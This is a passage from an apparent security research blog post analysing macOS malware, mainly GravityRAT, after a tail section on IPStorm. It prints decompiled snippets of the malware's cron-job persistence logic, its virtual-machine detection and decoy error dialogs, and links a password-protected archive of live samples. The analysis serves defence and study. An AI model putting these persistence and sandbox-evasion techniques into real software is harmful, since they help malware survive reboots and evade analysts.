<center style="color:#787878; padding-top:5px;">Listening Socket</center>

<p>&hellip;this might indicate that the malware creates a listener socket in process to facilitate the reverse shell (and perhaps passes the commands then to <code>bash</code> to execute).</p>
<p>In the Intezer <a href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">report</a>, the researches noted that the Linux version of <code>IPStorm</code> also engages in fraudulent activities:</p>
<blockquote>
"IPStorm‚Äôs Linux variant takes advantage of its being widespread to perform different fraudulent activity in the background, abusing gaming and ads monetization. Because it‚Äôs a botnet, the malware utilizes the large amount of requests from different trusted sources, thus not being blocked nor traceable." -Intezer
</blockquote>
<p>By sniffing network traffic we can confirm that the macOS variant also engages in such activities &hellip;specifically fraudulent ad monetization:</p>
<img src="../images/blog/blog_0x5F/ipAds.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Fraudulent Ad Monetization</center>

<p>&hellip;to a large number of remote IP addresses (though some may be other members of the botnet, or SSH brute-force attempts):</p>
<img src="../images/blog/blog_0x5F/ipConns.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">So ... Many ... Connections</center>

<br>
<h3 id="-gravityrat">üëæ <code>GravityRat</code></h3>
<div class="note">
<p>GravityRat is cross-platform remote administration tool (RAT &hellip;backdoor) now ported to macOS. The (available) samples, are persistent first-stage downloaders.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/GravityRAT.zip"><code>GravityRAT</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In October, Kaspersky published a new <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> on the intriguing cross-platform spyware, <code>GravityRAT</code> (&quot;<em>used to target the Indian armed forces</em>&quot;). In this report, they noted that for the first time, &ldquo;<em>there are now versions for &hellip;macOS</em>&rdquo;.</p>
<p>The Kaspersky repprt mentioned several samples (of trojanized applications) that were all persistent first-stage downloaders.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ shasum OSX.GravityRAT/*
086b22075d464b327a2bcbf8b66736560a215347  ~/OSX.GravityRAT/Enigma
696c7cbba2c9326298f3ddca5f22cfb20a4cd3ee  ~/OSX.GravityRAT/OrangeVault
e33894042f3798516967471d0ce1e92d10dec756  ~/OSX.GravityRAT/StrongBox
9b5b234e3b53f254bc9b3717232d1030e340c7f2  ~/OSX.GravityRAT/TeraSpace
</pre>
</div>
<p>&hellip;here, we&rsquo;ll focus mainly on the <code>Enigma</code> sample (<code>086b22075d464b327a2bcbf8b66736560a215347</code>) and <code>StrongBox</code> sample (<code>e33894042f3798516967471d0ce1e92d10dec756</code>).</p>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://securelist.com/gravityrat-the-spy-returns/99097/">&ldquo;GravityRAT: The spy returns&rdquo;</a></p>
</li>
<li>
<p><a href="https://objective-see.com/blog/blog_0x5B.html">&ldquo;Adventures in Anti-Gravity (Part 1)&rdquo;</a></p>
</li>
<li>
<p><a href="https://objective-see.com/blog/blog_0x5B.html">&ldquo;Adventures in Anti-Gravity (Part 2)&rdquo;</a></p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Trojanized Applications</span></p>
<p>Kaspersky&rsquo;s <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> notes that (at least one sample of) the Windows versions was &ldquo;<em>downloaded from the site enigma.net[.]in under the guise of a secure file sharing app to protect against ransomware</em>&rdquo;. The macOS version (<code>Enigma</code>) also appears to masquerade as such an application:</p>
<img src="../images/blog/blog_0x5B/enigma.png"  width="80%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Enigma&#39;s user interface</center>

<p>It&rsquo;s unknown how the user is coerced into downloading and running the trojaned application, but it they do - they may end up infected.</p>
<p>&hellip;may, as the sample(s) are unsigned:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ for i in OSX.GravityRAT/*; do codesign -dvvv $i; done
OSX.GravityRAT/Enigma: code object is not signed at all
OSX.GravityRAT/OrangeVault: code object is not signed at all
OSX.GravityRAT/StrongBox: code object is not signed at all
OSX.GravityRAT/TeraSpace: code object is not signed at all
</pre>
</div>
<p>&hellip;meaning that on recent version of macOS (Gatekeeper) will block them (unless the user manually removes the quarantine attribute, or if distirbuted in a .pkg, clicks through various warnings).</p>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Cron Job (of a 2<sup>nd</sup>-stage payload)</span>
</p>
<p>The samples themselves, don&rsquo;t appear to persist. However, (2<sup>nd</sup>-stage) payloads that are downloaded, are persisted (by the malware).</p>
<p>The Kaspersky <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a>, notes, &ldquo;<em>The Mac version &hellip;adds a cron job</em>&rdquo;</p>
<p>For the <code>Enigma</code> sample, we find this persistence logic in a function named <code>format</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format</span>(self, src, des, uc):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(des):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cp &#39;</span> <span style="color:#f92672">+</span> src <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> des)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">if</span> des[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>:] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.py&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;sudo crontab -l 2&gt;/dev/null; </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>                 echo <span style="color:#e6db74">&#34;*/2 * * * * python &#39; + des + &#39;&#34;</span> <span style="color:#f92672">|</span> sudo crontab <span style="color:#f92672">-</span><span style="color:#e6db74">&#39;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      os<span style="color:#f92672">.</span>chmod(des, <span style="color:#ae81ff">448</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      des <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> uc
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;sudo crontab -l 2&gt;/dev/null; </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>                 echo <span style="color:#e6db74">&#34;*/2 * * * * &#39; + des + &#39;&#34;</span> <span style="color:#f92672">|</span> sudo crontab <span style="color:#f92672">-</span><span style="color:#e6db74">&#39;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;+O &#39;</span></span></span></code></pre></div>
<p>Via <code>crontab</code> the malware persists a downloaded file (a 2nd-stage payload), as a cron job. This malicious cron job is set to run every two minutes (<code>*/2 * * * *</code>).</p>
<p>The <code>StrongBox</code> sample also persists a downloaded file, via a function <code>scheduleMac</code> to persist and launch the downloaded payload. The <code>scheduleMac</code> function persists the downloaded payload as cron job, via the builtin <code>crontab</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">scheduleMac</span>(<span style="color:#a6e22e">fname</span>,<span style="color:#a6e22e">agentTask</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  ...                                                         
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">poshellMac</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loclpth</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fname</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#a6e22e">execTask</span>(<span style="color:#e6db74">&#39;chmod -R 0700 &#39;</span>  <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span> <span style="color:#f92672">+</span>  <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span>  );                                                
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#a6e22e">arg</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">agentTask</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="color:#a6e22e">execTask</span>(<span style="color:#e6db74">&#39;crontab -l 2&gt;/dev/null; 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#e6db74">            echo \&#39; */2 * * * * &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;&#34;</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">poshellMac</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34; &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arg</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39; 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#e6db74">            | crontab -&#39;</span>, <span style="color:#a6e22e">puts22</span>);   
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>}</span></span></code></pre></div>
<p>&hellip;the persisted payload, will be (re)launched every two minutes (<code>*/2 * * * * </code>).</p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> 1<sup>st</sup>-stage downloader
</span>
</p>
<p>The macOS GravityRat samples appear to simply be 1<sup>st</sup>-stage downloaders &hellip;as the reach out to a remote command &amp; control servers to download (and persist) 2<sup>nd</sup>-stage payloads.</p>
<p>Before downloading and persisting the next stage payloads though, the malware performs several checks (implemented in the the <code>main.js</code> file):</p>
<ul>
<li>Check if running in a VM</li>
<li>Check if not connected to the Internet</li>
<li>Check if not running with Full Disk Access (FDA)</li>
</ul>
<p>Let&rsquo;s take a closer look at each of these.</p>
<p>The aptly named function, <code>VMCheck</code>, checks if the application is running within a Virtual Machine. Virtual machine checks are commonly found in malware, in an attempt to ascertain if a malware analyst is (likely) examining the code (in a virtual machine).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">VMCheck</span>(<span style="color:#a6e22e">stdout</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;innotek GmbH&#34;</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;VirtualBox&#34;</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;VMware&#34;</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;Microsoft Corporation&#34;</span> <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;HITACHI&#34;</span>))) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">srdr</span>, {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;vm&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  })
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBOX - Operation Not Permitted in VirtualBOX&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Action Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBOX - Unable to load components\n
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#e6db74">             Please exit virtual mode to launch the application.&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>  <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>  });</span></span></code></pre></div>
<p>&hellip;pretty easy to see its checking if the passed in parameter (<code>stdout</code>) contains strings related to popular virtual machine products (e.g. <code>VMware</code>). So what&rsquo;s in the <code>stdout</code> parameter? Well, if the malware is running on a macOS system, the <code>VMCheck</code> function will be invoked from within a function named <code>Vmm</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Vmm</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">modname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;Model Name&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">smc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;SMC&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">modid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;Model Identifier&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rom</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;ROM&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">snum</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;Serial Number&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    <span style="color:#a6e22e">VMCheck</span>(<span style="color:#a6e22e">modname</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">smc</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">modid</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rom</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">snum</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}</span></span></code></pre></div>
<p>The <code>Vmm</code> function gets the system identifying information such as the model name, model identifier, serial number and more. If executed within a virtual machine, this information will contain VM-related strings:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ system_profiler SPHardwareDataType | grep 'Model Identifier'
  Model Identifier: VMware7,1


$ system_profiler SPHardwareDataType | grep 'ROM'
      Boot ROM Version: VMW71.00V.16221537.B64.2005150253
      Apple ROM Info: [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine

</pre>
</div>
<p>&hellip;thus the malware will be able to detect it&rsquo;s running within a virtual machine &hellip;and display an error message</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">VMCheck</span>(<span style="color:#a6e22e">stdout</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBOX - Operation Not Permitted&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Oops!! Something went wrong. &#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please check your internet connection and try again.&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>      <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>      <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>  });</span></span></code></pre></div>
